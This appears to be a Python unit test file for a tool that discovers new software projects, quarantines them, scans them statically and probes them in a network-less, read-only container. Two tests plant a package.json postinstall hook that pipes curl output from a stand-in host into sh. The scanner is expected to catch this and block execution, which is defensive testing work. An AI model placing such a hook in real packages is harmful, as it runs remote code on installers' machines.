"""Technology-radar discovery, quarantine, and report contracts."""

from __future__ import annotations

import json
import sys
import tempfile
import unittest
from unittest import mock
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

import technology_radar  # noqa: E402


class TechnologyRadarTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name)

    def tearDown(self):
        self.temp.cleanup()

    def test_github_results_keep_low_adoption_newcomers_eligible(self):
        payload = {
            "items": [{
                "full_name": "example/new-agent-runtime",
                "html_url": "https://github.com/example/new-agent-runtime",
                "description": "A new coding agent sandbox",
                "stargazers_count": 3,
                "forks_count": 0,
                "open_issues_count": 1,
                "created_at": "2026-09-20T00:00:00Z",
                "updated_at": "2026-09-21T00:00:00Z",
                "pushed_at": "2026-09-21T00:00:00Z",
                "license": {"spdx_id": "MIT"},
                "archived": False,
            }]
        }

        candidates = technology_radar.parse_github_results(payload, query="AI agent")

        self.assertEqual(len(candidates), 1)
        self.assertEqual(candidates[0].stars, 3)
        self.assertEqual(candidates[0].disposition, "evaluate")
        self.assertIn("recency", candidates[0].signals)

    def test_youtube_results_are_evidence_sources_not_popularity_gates(self):
        payload = {"items": [{
            "id": {"videoId": "abc123"},
            "snippet": {
                "title": "New agent memory runtime",
                "description": "Technical walkthrough",
                "channelTitle": "Builder Lab",
                "publishedAt": "2026-09-21T00:00:00Z",
            },
        }]}

        candidates = technology_radar.parse_youtube_results(payload, query="agent memory")

        self.assertEqual(candidates[0].source, "youtube")
        self.assertEqual(candidates[0].stars, 0)
        self.assertEqual(candidates[0].disposition, "research-lead")
        self.assertIn("recency", candidates[0].signals)

    def test_operator_adapter_seeds_enter_the_radar_even_with_no_adoption(self):
        manifest = self.root / "adapters.json"
        manifest.write_text(json.dumps({
            "schema": "triai.capability-adapters.v1",
            "adapters": [{
                "id": "new-tool", "name": "New Tool", "description": "Useful new agent runtime.",
                "upstream_url": "https://github.com/example/new-tool",
                "availability": "missing", "adapter_status": "radar-candidate",
            }],
        }), encoding="utf-8")

        candidates = technology_radar.load_operator_seeds(manifest)

        self.assertEqual(len(candidates), 1)
        self.assertEqual(candidates[0].stars, 0)
        self.assertIn("operator-requested", candidates[0].signals)
        self.assertEqual(candidates[0].disposition, "evaluate")

    def test_requested_seed_evaluation_rotates_instead_of_repeating_first_three(self):
        candidates = [technology_radar.Candidate(
            source="github", name=f"example/tool-{index}",
            url=f"https://github.com/example/tool-{index}", description="tool",
            stars=0, forks=0, open_issues=0, created_at="", updated_at="",
            license_id=None, query="operator-adapter-manifest",
            signals=("operator-requested",), disposition="evaluate",
        ) for index in range(5)]

        first = technology_radar.select_evaluation_candidates(candidates, limit=2, rotation=0)
        second = technology_radar.select_evaluation_candidates(candidates, limit=2, rotation=2)

        self.assertEqual([item.name for item in first], ["example/tool-0", "example/tool-1"])
        self.assertEqual([item.name for item in second], ["example/tool-2", "example/tool-3"])

    def test_hacker_news_results_become_research_leads(self):
        payload = {"hits": [{
            "objectID": "42", "title": "Show HN: New coding agent",
            "url": "https://example.test/agent", "created_at": "2026-09-21T00:00:00Z",
            "points": 2, "num_comments": 1,
        }]}

        candidates = technology_radar.parse_hacker_news_results(payload, query="coding agent")

        self.assertEqual(candidates[0].source, "hacker_news")
        self.assertEqual(candidates[0].disposition, "research-lead")
        self.assertEqual(candidates[0].stars, 2)

    def test_static_scan_reports_risk_without_declaring_malware_from_popularity(self):
        (self.root / "package.json").write_text(
            json.dumps({"scripts": {"postinstall": "curl https://example.test/x | sh"}}),
            encoding="utf-8",
        )
        (self.root / "payload.exe").write_bytes(b"MZ")

        report = technology_radar.static_scan(self.root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("package-lifecycle-script", rule_ids)
        self.assertIn("executable-artifact", rule_ids)
        self.assertEqual(report.verdict, "manual_review")
        self.assertNotIn("stars", " ".join(item.detail for item in report.findings))

    def test_container_command_is_disposable_and_denies_network_and_privilege(self):
        command = technology_radar.container_probe_command(
            self.root,
            image="python:3.13-alpine",
            probe=("python", "-m", "compileall", "-q", "/workspace"),
        )

        rendered = " ".join(command)
        self.assertIn("--network none", rendered)
        self.assertIn("--read-only", rendered)
        self.assertIn("--cap-drop ALL", rendered)
        self.assertIn("no-new-privileges", rendered)
        self.assertIn("/workspace:ro", rendered)

    def test_dynamic_probe_refuses_to_run_without_a_real_container_boundary(self):
        result = technology_radar.run_dynamic_probe(
            self.root,
            docker_available=lambda: False,
        )

        self.assertEqual(result.status, "not_run")
        self.assertIn("Docker", result.reason)

    def test_node_candidate_gets_a_manifest_probe_instead_of_python_compile(self):
        (self.root / "package.json").write_text(
            json.dumps({"name": "candidate", "scripts": {"test": "vitest"}}),
            encoding="utf-8",
        )

        image, probe, label = technology_radar.select_container_probe(self.root)

        self.assertEqual(image, "node:22-alpine")
        self.assertEqual(probe[0], "node")
        self.assertIn("package.json", " ".join(probe))
        self.assertEqual(label, "Node manifest parse")

    def test_python_candidate_gets_a_compile_probe(self):
        (self.root / "pyproject.toml").write_text(
            "[project]\nname = 'candidate'\nversion = '0.1.0'\n",
            encoding="utf-8",
        )

        image, probe, label = technology_radar.select_container_probe(self.root)

        self.assertEqual(image, "python:3.13-alpine")
        self.assertEqual(probe[:3], ("python", "-m", "compileall"))
        self.assertEqual(label, "Python syntax compile")

    def test_report_is_machine_readable_and_retains_evidence(self):
        candidate = technology_radar.Candidate(
            source="github",
            name="example/tool",
            url="https://github.com/example/tool",
            description="tool",
            stars=0,
            forks=0,
            open_issues=0,
            created_at="2026-09-21T00:00:00Z",
            updated_at="2026-09-21T00:00:00Z",
            license_id=None,
            query="agent",
            signals=("recency",),
            disposition="evaluate",
        )
        path = self.root / "report.json"

        technology_radar.write_report(path, [candidate])

        document = json.loads(path.read_text(encoding="utf-8"))
        self.assertEqual(document["schema"], "triai.technology-radar.v1")
        self.assertEqual(document["candidates"][0]["name"], "example/tool")

    def test_candidate_evaluation_quarantines_then_scans_before_probe(self):
        candidate = technology_radar.Candidate(
            source="github", name="example/tool",
            url="https://github.com/example/tool", description="tool",
            stars=1, forks=0, open_issues=0,
            created_at="2026-09-20T00:00:00Z",
            updated_at="2026-09-21T00:00:00Z", license_id="MIT",
            query="agent", signals=("recency",), disposition="evaluate",
        )

        def fetch(_candidate, destination):
            destination.mkdir(parents=True)
            (destination / "tool.py").write_text("print('ok')\n", encoding="utf-8")
            return destination

        probe = technology_radar.DynamicProbe("passed", "isolated")
        with mock.patch.object(technology_radar, "run_dynamic_probe", return_value=probe):
            result = technology_radar.evaluate_candidate(
                candidate, quarantine_root=self.root, fetcher=fetch
            )

        self.assertEqual(result.static.verdict, "static_clear")
        self.assertEqual(result.dynamic.status, "passed")
        self.assertEqual(result.disposition, "candidate-ready-for-adapter-review")
        self.assertTrue(Path(result.quarantine_path).is_dir())

    def test_critical_static_finding_prevents_dynamic_execution(self):
        candidate = technology_radar.Candidate(
            source="github", name="example/tool",
            url="https://github.com/example/tool", description="tool",
            stars=0, forks=0, open_issues=0,
            created_at="", updated_at="", license_id=None,
            query="agent", signals=("recency",), disposition="evaluate",
        )

        def fetch(_candidate, destination):
            destination.mkdir(parents=True)
            (destination / "package.json").write_text(json.dumps({
                "scripts": {"postinstall": "curl https://bad.test/x | sh"}
            }), encoding="utf-8")
            return destination

        with mock.patch.object(technology_radar, "run_dynamic_probe") as dynamic:
            result = technology_radar.evaluate_candidate(
                candidate, quarantine_root=self.root, fetcher=fetch
            )

        dynamic.assert_not_called()
        self.assertEqual(result.disposition, "manual-security-review")
        self.assertEqual(result.dynamic.status, "blocked")


if __name__ == "__main__":
    unittest.main()
